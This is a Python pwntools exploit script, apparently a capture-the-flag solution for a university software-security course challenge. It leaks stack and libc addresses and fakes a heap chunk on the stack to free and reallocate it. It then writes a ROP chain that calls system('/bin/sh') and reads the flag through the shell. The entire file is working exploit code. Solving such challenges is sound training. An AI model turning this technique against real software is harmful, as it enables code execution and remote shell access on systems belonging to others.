#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

# 1) docker compose -f debug.yml up
# 2) docker exec -ti $(docker ps --quiet --filter 'ancestor=softsec/ghostbusters') /bin/bash
# 3) gdb -p "$(pgrep -n vuln)"

conn = pwn.remote('tasks.ws24.softsec.rub.de', 33739)
#conn = pwn.remote('127.0.0.1', 1024)


# 1) get stack and libc pointer
conn.recvuntil(b'Operator ID: ')
raw_pointer = conn.recv(15)

stack_pointer = int(raw_pointer, 10)

print(f'stack at: {hex(stack_pointer)}')
conn.recvuntil(b'Paranormal Level: ')
raw_pointer = conn.recv(15)

libc_base = int(raw_pointer, 10) - libc.symbols['kill']
libc.address = libc_base

print(f'system() at: {hex(libc.symbols["system"])}')
conn.recvuntil(b'SYSTEM READY FOR OPERATION ===\n')


# 2) Change name to chunk header (0x70)
conn.recvuntil(b'[e]nd session')
conn.sendline(b'g')
conn.recvuntil(b'Do you want to update your profile? [y/n]\n')
conn.sendline(b'y')
conn.recvuntil(b'Enter your new name:\n')
conn.send(b'\00'*16)
conn.recvuntil(b'Enter your new surname:\n')
payload = b'\00'*7 + pwn.p64(0x70) + b'\00' # size of the malloced stuff
conn.send(payload)
conn.recvuntil(b'[e]nd session\n')
conn.sendline(b'a')

# we wrote 0x70 at stack_pointer+8
# malloc at stack_pointer+16


# 3) Delete: free stack memory
conn.recvuntil(b'[e]nd session')
conn.sendline(b'd')
pointer_to_free = stack_pointer + 16
print(pointer_to_free)
conn.sendline(str(pointer_to_free).encode('ascii'))
conn.recvuntil(b'Equipment not found\n')


# 4) ropchain:
rop = pwn.ROP(libc)
rop.call(rop.ret)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])


# 5) Add: malloc the stack
conn.recvuntil(b'[e]nd session')
conn.sendline(b'a')
conn.recvuntil(b'Enter equipment name:\n')
conn.sendline(b'A'*3*8 + rop.chain())


# 6) Exit: to trigger ropchain
conn.recvuntil(b'[e]nd session')
conn.sendline(b'e')
# print flag with remote shell
conn.sendline(b'cat /flag')

conn.interactive()